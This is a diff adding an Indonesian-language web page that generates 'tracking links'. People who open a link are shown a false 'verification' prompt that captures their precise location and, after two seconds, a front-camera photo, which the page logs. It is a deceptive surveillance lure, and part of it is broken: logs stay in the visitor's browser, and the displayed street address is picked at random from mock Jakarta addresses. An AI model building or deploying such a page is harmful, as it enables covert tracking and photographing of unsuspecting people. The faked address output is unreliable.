@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website Pelacak Lokasi & Kamera</title>
+    <style>
+        :root {
+            --primary: #4361ee;
+            --secondary: #3a0ca3;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .admin-container {
+            max-width: 1200px;
+            width: 100%;
+            display: none;
+        }
+        
+        .tracking-container {
+            max-width: 500px;
+            width: 100%;
+            display: none;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px 0;
+            color: white;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        
+        .card-title {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            color: var(--primary);
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+        
+        input:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+        
+        button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        
+        button:hover {
+            background-color: var(--secondary);
+        }
+        
+        .btn-success {
+            background-color: var(--success);
+        }
+        
+        .btn-success:hover {
+            background-color: #218838;
+        }
+        
+        .btn-danger {
+            background-color: var(--danger);
+        }
+        
+        .btn-danger:hover {
+            background-color: #c82333;
+        }
+        
+        .tracking-link {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            word-break: break-all;
+            font-family: monospace;
+            border-left: 4px solid var(--success);
+        }
+        
+        .logs-container {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #e1e5e9;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 15px;
+        }
+        
+        .log-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .log-item:last-child {
+            border-bottom: none;
+        }
+        
+        .log-image {
+            width: 50px;
+            height: 50px;
+            border-radius: 5px;
+            object-fit: cover;
+        }
+        
+        .log-info {
+            flex: 1;
+        }
+        
+        .log-time {
+            font-size: 0.8rem;
+            color: #6c757d;
+        }
+        
+        .permission-request {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .camera-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        #camera-preview {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            background: #000;
+            display: none;
+        }
+        
+        .status-message {
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin: 15px 0;
+            display: none;
+        }
+        
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .status-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        .privacy-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #856404;
+            font-size: 0.9rem;
+        }
+        
+        .location-data {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            display: none;
+        }
+        
+        .location-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .location-label {
+            font-weight: 600;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: white;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: #6c757d;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            color: white;
+            font-size: 0.8rem;
+            opacity: 0.8;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            color: white;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .tab.active {
+            border-bottom: 3px solid white;
+            font-weight: 600;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Admin Dashboard (Hanya muncul saat tidak ada parameter track) -->
+    <div class="admin-container" id="admin-container">
+        <header>
+            <h1>Website Pelacak Lokasi & Kamera</h1>
+            <p class="subtitle">Dashboard Admin - Buat dan kelola link tracking</p>
+        </header>
+        
+        <div class="privacy-notice">
+            <strong>Penting:</strong> Sistem ini hanya boleh digunakan dengan persetujuan eksplisit dari pengguna.
+        </div>
+        
+        <div class="tabs">
+            <div class="tab active" data-tab="create">Buat Link</div>
+            <div class="tab" data-tab="logs">Log Aktivitas</div>
+        </div>
+        
+        <div class="tab-content active" id="create-tab">
+            <div class="card">
+                <h2 class="card-title">Buat Link Tracking Baru</h2>
+                
+                <div class="form-group">
+                    <label for="link-name">Nama Link Tracking</label>
+                    <input type="text" id="link-name" placeholder="Contoh: Verifikasi Keamanan">
+                </div>
+                
+                <div class="form-group">
+                    <label for="destination-url">URL Tujuan Setelah Foto (opsional)</label>
+                    <input type="text" id="destination-url" placeholder="https://websiteanda.com/terimakasih">
+                </div>
+                
+                <button id="generate-btn">Buat Link Tracking</button>
+                
+                <div id="tracking-link-container" style="display: none;">
+                    <h3 class="card-title">Link Tracking Anda</h3>
+                    <p>Salin dan bagikan link ini:</p>
+                    <div class="tracking-link" id="tracking-link"></div>
+                    <button class="copy-btn" id="copy-btn" style="margin-top: 10px;">Salin Link</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="tab-content" id="logs-tab">
+            <div class="card">
+                <h2 class="card-title">Log Aktivitas Tracking</h2>
+                
+                <div class="stats">
+                    <div class="stat-card">
+                        <div class="stat-value" id="total-clicks">0</div>
+                        <div class="stat-label">Total Akses</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="photos-captured">0</div>
+                        <div class="stat-label">Foto Diambil</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="locations-tracked">0</div>
+                        <div class="stat-label">Lokasi Dilacak</div>
+                    </div>
+                </div>
+                
+                <div class="logs-container" id="logs-container">
+                    <div id="no-logs">Belum ada aktivitas. Buat dan bagikan link tracking terlebih dahulu.</div>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Website Pelacak Lokasi & Kamera &copy; 2023</p>
+        </footer>
+    </div>
+
+    <!-- Tracking Interface (Hanya muncul saat ada parameter track) -->
+    <div class="tracking-container" id="tracking-container">
+        <div class="card">
+            <div class="permission-request" id="permission-request">
+                <h3>Verifikasi Diperlukan</h3>
+                <p>Untuk melanjutkan, kami perlu mengakses kamera dan lokasi Anda untuk keperluan verifikasi.</p>
+                <div class="btn-group">
+                    <button class="allow-btn btn-success" id="allow-camera">Izinkan Akses</button>
+                    <button class="deny-btn btn-danger" id="deny-camera">Tolak</button>
+                </div>
+            </div>
+            
+            <div class="camera-container">
+                <video id="camera-preview" autoplay playsinline></video>
+            </div>
+            
+            <div class="status-message" id="tracking-status"></div>
+            
+            <div class="location-data" id="location-data">
+                <h3>Informasi Lokasi</h3>
+                <div class="location-item">
+                    <span class="location-label">Koordinat:</span>
+                    <span class="location-value" id="location-coords">-</span>
+                </div>
+                <div class="location-item">
+                    <span class="location-label">Alamat:</span>
+                    <span class="location-value" id="location-address">-</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data storage
+        let trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
+        let trackingLogs = JSON.parse(localStorage.getItem('trackingLogs')) || [];
+        
+        // DOM Elements
+        const adminContainer = document.getElementById('admin-container');
+        const trackingContainer = document.getElementById('tracking-container');
+        const generateBtn = document.getElementById('generate-btn');
+        const trackingLinkElement = document.getElementById('tracking-link');
+        const trackingLinkContainer = document.getElementById('tracking-link-container');
+        const copyBtn = document.getElementById('copy-btn');
+        const logsContainer = document.getElementById('logs-container');
+        const noLogs = document.getElementById('no-logs');
+        const permissionRequest = document.getElementById('permission-request');
+        const allowCameraBtn = document.getElementById('allow-camera');
+        const denyCameraBtn = document.getElementById('deny-camera');
+        const cameraPreview = document.getElementById('camera-preview');
+        const trackingStatus = document.getElementById('tracking-status');
+        const locationData = document.getElementById('location-data');
+        const locationCoords = document.getElementById('location-coords');
+        const locationAddress = document.getElementById('location-address');
+        
+        // Stats elements
+        const totalClicksEl = document.getElementById('total-clicks');
+        const photosCapturedEl = document.getElementById('photos-captured');
+        const locationsTrackedEl = document.getElementById('locations-tracked');
+        
+        // Tab functionality
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+        
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabId = tab.getAttribute('data-tab');
+                
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                
+                tabContents.forEach(content => {
+                    content.classList.remove('active');
+                    if (content.id === `${tabId}-tab`) {
+                        content.classList.add('active');
+                    }
+                });
+            });
+        });
+        
+        let stream = null;
+        let currentLinkId = null;
+        let currentLocation = null;
+        
+        // Generate tracking link
+        generateBtn.addEventListener('click', () => {
+            const linkName = document.getElementById('link-name').value;
+            const destinationUrl = document.getElementById('destination-url').value;
+            
+            if (!linkName) {
+                alert('Nama link harus diisi!');
+                return;
+            }
+            
+            // Generate unique ID
+            const linkId = generateId();
+            
+            // Create tracking URL - menggunakan path yang sama dengan parameter track
+            const trackingUrl = `${window.location.origin}${window.location.pathname}?track=${linkId}`;
+            
+            // Save to tracking links
+            const newLink = {
+                id: linkId,
+                name: linkName,
+                destination: destinationUrl,
+                created: new Date().toISOString()
+            };
+            
+            trackingLinks.push(newLink);
+            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
+            
+            // Show tracking link
+            trackingLinkElement.textContent = trackingUrl;
+            trackingLinkContainer.style.display = 'block';
+            
+            // Clear form
+            document.getElementById('link-name').value = '';
+            document.getElementById('destination-url').value = '';
+            
+            updateLogsView();
+            updateStats();
+        });
+        
+        // Copy tracking link
+        copyBtn.addEventListener('click', () => {
+            const textToCopy = trackingLinkElement.textContent;
+            
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = copyBtn.textContent;
+                copyBtn.textContent = 'Tersalin!';
+                copyBtn.classList.add('btn-success');
+                
+                setTimeout(() => {
+                    copyBtn.textContent = originalText;
+                    copyBtn.classList.remove('btn-success');
+                }, 2000);
+            });
+        });
+        
+        // Allow camera access (tracking panel)
+        allowCameraBtn.addEventListener('click', async () => {
+            try {
+                // Get location first
+                await getLocation();
+                
+                // Then access camera
+                await accessCamera();
+                
+            } catch (err) {
+                console.error('Error in tracking process:', err);
+                showStatus(trackingStatus, 'Terjadi kesalahan: ' + err.message, 'error');
+            }
+        });
+        
+        // Get user location
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation tidak didukung oleh browser ini'));
+                    return;
+                }
+                
+                showStatus(trackingStatus, 'Mendapatkan lokasi...', 'warning');
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        
+                        currentLocation = {
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: position.coords.accuracy
+                        };
+                        
+                        // Try to get address from coordinates
+                        try {
+                            const address = await getAddressFromCoords(lat, lng);
+                            currentLocation.address = address;
+                        } catch (e) {
+                            console.error('Error getting address:', e);
+                            currentLocation.address = 'Tidak dapat mendapatkan alamat';
+                        }
+                        
+                        // Display location data
+                        locationCoords.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+                        locationAddress.textContent = currentLocation.address;
+                        locationData.style.display = 'block';
+                        
+                        resolve(currentLocation);
+                    },
+                    (error) => {
+                        let errorMessage = 'Tidak dapat mendapatkan lokasi: ';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage += 'Akses lokasi ditolak';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage += 'Informasi lokasi tidak tersedia';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage += 'Permintaan lokasi timeout';
+                                break;
+                            default:
+                                errorMessage += 'Error tidak diketahui';
+                        }
+                        reject(new Error(errorMessage));
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            });
+        }
+        
+        // Access camera for tracking
+        async function accessCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    } 
+                });
+                
+                cameraPreview.srcObject = stream;
+                cameraPreview.style.display = 'block';
+                permissionRequest.style.display = 'none';
+                
+                showStatus(trackingStatus, 'Mengakses kamera...', 'warning');
+                
+                // Automatically capture photo after 2 seconds
+                setTimeout(() => {
+                    captureAndSavePhoto();
+                }, 2000);
+                
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                showStatus(trackingStatus, 'Gagal mengakses kamera: ' + err.message, 'error');
+                
+                // Log the error but continue with location data if available
+                logTrackingActivity('camera_error', null, currentLocation ? true : false);
+                redirectToDestination();
+            }
+        }
+        
+        // Capture and save photo
+        function captureAndSavePhoto() {
+            if (!stream) return;
+            
+            showStatus(trackingStatus, 'Mengambil foto...', 'warning');
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = cameraPreview.videoWidth;
+            canvas.height = cameraPreview.videoHeight;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Save the captured image and log activity
+            logTrackingActivity('captured', imageData, currentLocation ? true : false);
+            
+            showStatus(trackingStatus, 'Foto berhasil diambil!', 'success');
+            
+            // Redirect to destination after 3 seconds
+            setTimeout(() => {
+                redirectToDestination();
+            }, 3000);
+        }
+        
+        // Deny camera access (tracking panel)
+        denyCameraBtn.addEventListener('click', () => {
+            showStatus(trackingStatus, 'Akses ditolak. Tidak dapat melanjutkan.', 'error');
+            permissionRequest.style.display = 'none';
+            
+            // Log the denied attempt
+            logTrackingActivity('denied', null, false);
+            
+            // Redirect if destination URL is set
+            setTimeout(() => {
+                redirectToDestination();
+            }, 3000);
+        });
+        
+        // Redirect to destination URL
+        function redirectToDestination() {
+            const link = trackingLinks.find(l => l.id === currentLinkId);
+            if (link && link.destination) {
+                window.location.href = link.destination;
+            }
+        }
+        
+        // Get address from coordinates (simulated)
+        function getAddressFromCoords(lat, lng) {
+            // In a real implementation, you would use a reverse geocoding API
+            // For demo purposes, we'll return a mock address
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const addresses = [
+                        'Jl. Sudirman No. 123, Jakarta Pusat',
+                        'Jl. Thamrin No. 45, Jakarta Selatan', 
+                        'Jl. Gatot Subroto No. 67, Jakarta Barat',
+                        'Jl. HR Rasuna Said No. 89, Jakarta Selatan',
+                        'Jl. MH Thamrin No. 10, Jakarta Pusat'
+                    ];
+                    const randomAddress = addresses[Math.floor(Math.random() * addresses.length)];
+                    resolve(randomAddress);
+                }, 1000);
+            });
+        }
+        
+        // Update logs view
+        function updateLogsView() {
+            if (trackingLogs.length === 0) {
+                noLogs.style.display = 'block';
+                logsContainer.innerHTML = '';
+                logsContainer.appendChild(noLogs);
+                return;
+            }
+            
+            noLogs.style.display = 'none';
+            
+            // Clear and populate logs
+            logsContainer.innerHTML = '';
+            
+            // Show logs in reverse order (newest first)
+            [...trackingLogs].reverse().forEach(log => {
+                const logItem = document.createElement('div');
+                logItem.className = 'log-item';
+                
+                if (log.image) {
+                    const img = document.createElement('img');
+                    img.src = log.image;
+                    img.className = 'log-image';
+                    img.alt = 'Captured image';
+                    logItem.appendChild(img);
+                } else {
+                    const placeholder = document.createElement('div');
+                    placeholder.className = 'log-image';
+                    placeholder.style.backgroundColor = '#f8f9fa';
+                    placeholder.style.display = 'flex';
+                    placeholder.style.alignItems = 'center';
+                    placeholder.style.justifyContent = 'center';
+                    placeholder.innerHTML = '<span>No Image</span>';
+                    logItem.appendChild(placeholder);
+                }
+                
+                const logInfo = document.createElement('div');
+                logInfo.className = 'log-info';
+                
+                const link = trackingLinks.find(l => l.id === log.linkId);
+                const linkName = link ? link.name : 'Unknown Link';
+                
+                const statusText = document.createElement('div');
+                statusText.style.fontWeight = '600';
+                
+                let statusDisplay = '';
+                if (log.status === 'captured') {
+                    statusDisplay = 'Foto Diambil';
+                } else if (log.status === 'denied') {
+                    statusDisplay = 'Akses Ditolak';
+                } else if (log.status === 'camera_error') {
+                    statusDisplay = 'Error Kamera';
+                } else if (log.status === 'accessed') {
+                    statusDisplay = 'Diakses';
+                } else {
+                    statusDisplay = log.status;
+                }
+                
+                statusText.textContent = `${linkName} - ${statusDisplay}`;
+                
+                const timeText = document.createElement('div');
+                timeText.className = 'log-time';
+                timeText.textContent = new Date(log.timestamp).toLocaleString('id-ID');
+                
+                const locationStatus = document.createElement('div');
+                locationStatus.className = 'log-time';
+                locationStatus.textContent = `Lokasi: ${log.locationTracked ? 'Terkirim' : 'Tidak'}`;
+                
+                logInfo.appendChild(statusText);
+                logInfo.appendChild(timeText);
+                logInfo.appendChild(locationStatus);
+                
+                if (log.locationData) {
+                    const locationInfo = document.createElement('div');
+                    locationInfo.className = 'log-time';
+                    locationInfo.textContent = `Koordinat: ${log.locationData.latitude.toFixed(4)}, ${log.locationData.longitude.toFixed(4)}`;
+                    logInfo.appendChild(locationInfo);
+                }
+                
+                logItem.appendChild(logInfo);
+                logsContainer.appendChild(logItem);
+            });
+        }
+        
+        // Update stats
+        function updateStats() {
+            const totalClicks = trackingLogs.length;
+            const photosCaptured = trackingLogs.filter(log => log.status === 'captured').length;
+            const locationsTracked = trackingLogs.filter(log => log.locationTracked).length;
+            
+            totalClicksEl.textContent = totalClicks;
+            photosCapturedEl.textContent = photosCaptured;
+            locationsTrackedEl.textContent = locationsTracked;
+        }
+        
+        // Log tracking activity
+        function logTrackingActivity(status, image = null, locationTracked = false) {
+            const logData = {
+                linkId: currentLinkId,
+                timestamp: new Date().toISOString(),
+                status: status,
+                image: image,
+                locationTracked: locationTracked
+            };
+            
+            if (locationTracked && currentLocation) {
+                logData.locationData = currentLocation;
+            }
+            
+            trackingLogs.push(logData);
+            localStorage.setItem('trackingLogs', JSON.stringify(trackingLogs));
+            
+            updateLogsView();
+            updateStats();
+        }
+        
+        // Show status message
+        function showStatus(element, message, type) {
+            element.textContent = message;
+            element.className = 'status-message';
+            
+            if (type === 'success') {
+                element.classList.add('status-success');
+            } else if (type === 'error') {
+                element.classList.add('status-error');
+            } else if (type === 'warning') {
+                element.classList.add('status-warning');
+            }
+            
+            element.style.display = 'block';
+        }
+        
+        // Generate unique ID
+        function generateId() {
+            return 'track_' + Math.random().toString(36).substr(2, 9);
+        }
+        
+        // Check if this is a tracking link
+        function checkForTracking() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const trackId = urlParams.get('track');
+            
+            if (trackId) {
+                // Find the link
+                const link = trackingLinks.find(l => l.id === trackId);
+                
+                if (link) {
+                    currentLinkId = trackId;
+                    
+                    // Show tracking interface and hide admin
+                    adminContainer.style.display = 'none';
+                    trackingContainer.style.display = 'block';
+                    
+                    // Log the access
+                    logTrackingActivity('accessed', null, false);
+                } else {
+                    // If link not found, show error in tracking interface
+                    adminContainer.style.display = 'none';
+                    trackingContainer.style.display = 'block';
+                    showStatus(trackingStatus, 'Link tracking tidak valid.', 'error');
+                    permissionRequest.style.display = 'none';
+                }
+            } else {
+                // No track parameter, show admin interface
+                adminContainer.style.display = 'block';
+                trackingContainer.style.display = 'none';
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            updateLogsView();
+            updateStats();
+            checkForTracking();
+        });
+    </script>
+</body>
+</html>
